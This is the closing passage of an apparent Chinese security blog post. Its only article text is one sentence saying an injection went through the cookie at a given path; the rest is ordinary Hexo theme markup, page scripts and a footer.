<p>所以是从cookie注入进去的。路径就是**&#x2F;index.php&#x2F;archives&#x2F;1&#x2F;**</p>

  </article>
  <!-- tag -->
  <div class="mt-12 pt-6 border-t border-gray-200">
    
  </div>
  <!-- prev and next -->
  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
    <div>
      
        <a href="/2024/09/20/flask-debug-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84pin%E7%A0%81/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
          flask debug 模式下的pin码
        </a>
      
    </div>
    <div>
      
    </div>
  </div>
  <!-- comment -->
  <div class="article-comments mt-12">
    

  </div>
</section>
<!-- js inspect -->

<script src="/lib/clipboard.min.js"></script>


<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
  });
</script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>



<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
  $(document).ready(() => {
    const maraidConfig = {
      theme: "default",
      logLevel: 3,
      flowchart: { curve: "linear" },
      gantt: { axisFormat: "%m/%d/%Y" },
      sequence: { actorMargin: 50 },
    };
    mermaid.initialize(maraidConfig);
  });
</script>



<script src="/lib/fancybox/fancybox.umd.min.js"></script>

<script>
  $(document).ready(() => {
    $('.post-content').each(function(i){
      $(this).find('img').each(function(){
        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
        var alt = this.alt;
        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
      });
      $(this).find('.fancybox').each(function(){
        $(this).attr('rel', 'article' + i);
      });
    });

    Fancybox.bind('[data-fancybox="gallery"]', {
        // options
    })
  })
</script>

<!-- tocbot begin -->

<script src="/lib/tocbot/tocbot.min.js"></script>

<script>
  $(document).ready(() => {
      tocbot.init({
        // Where to render the table of contents.
        tocSelector: '.post-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.post-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3',
        // For headings inside relative or absolute positioned containers within content.
        hasInnerContainers: true,
    });
  })
</script>
<!-- tocbot end -->


  </main>
  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
  <!-- busuanzi -->
  
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- Busuanzi Analytics -->
<div class="flex items-center gap-2">
  <span>Visitors</span>
  <span id="busuanzi_value_site_uv"></span>
  <span>Page Views</span>
  <span id="busuanzi_value_site_pv"></span>
</div>
<!-- End Busuanzi Analytics -->


  <!-- copyright -->
  <div class="flex items-center gap-2">
    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
    <span>© 2022</span>
    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
    <a href="https://github.com/xbmlz" target="_blank" rel="noopener noreferrer">xbmlz</a>
  </div>
  <!-- powered by -->
  <div class="flex items-center gap-2">
    <span>Powered by</span>
    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
    <span>&</span>
    <a href="https://github.com/xbmlz/hexo-theme-maple" target="_blank" rel="noopener noreferrer">Maple</a>
  </div>

</footer>

  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
    <span class="flex justify-center items-center text-sm">
      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
      <span id="scrollpercent"><span>0</span> %</span>
    </span>
  </div>
  
<script src="/js/main.js"></script>


  <script>
    $(document).ready(function () {
      const mapleCount = "10";
      const speed = "0.5";
      const mapleEl = document.getElementById("maple");
      const maples = Array.from({ length: mapleCount }).map(() => {
        const maple = document.createElement("div");
        const scale = Math.random() * 0.5 + 0.5;
        const offset = Math.random() * 2 - 1;
        const x = Math.random() * mapleEl.clientWidth;
        const y = -Math.random() * mapleEl.clientHeight;
        const duration = 10 / speed;
        const delay = -duration;
        maple.className = "maple";
        maple.style.width = `${24 * scale}px`;
        maple.style.height = `${24 * scale}px`;
        maple.style.left = `${x}px`;
        maple.style.top = `${y}px`;
        maple.style.setProperty("--maple-fall-offset", offset);
        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
        maple.style.animation = `fall ${duration}s linear infinite`;
        maple.style.animationDelay = `${delay}s`;
        mapleEl.appendChild(maple)
        return maple
      })
    });
  </script>
  


  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
</body>

</html>
